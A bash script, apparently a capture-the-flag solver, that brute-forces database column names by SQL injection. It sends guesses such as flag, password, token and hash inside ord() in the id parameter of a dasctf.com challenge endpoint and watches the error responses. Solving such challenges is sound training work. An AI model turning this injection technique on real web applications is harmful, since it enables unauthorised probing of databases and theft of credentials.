#!/bin/bash
COLUMNS="flag fl4g f1ag secret key hidden answer result value data info text content note msg message desc description output flag_content flag_value flag_data flag_text flag_string flag_flag real_flag the_flag actual_flag ctf_flag ctf dasctf password passwd pass pwd user username admin token hash code pin"
for col in $COLUMNS; do
  resp=$(curl -s "https://faa3f919815210aa3a3c44f4.http-ctf2.dasctf.com/search.php?id=ord($col)")
  if echo "$resp" | grep -q "ERROR！！！"; then
    echo "FOUND: $col"
  fi
done
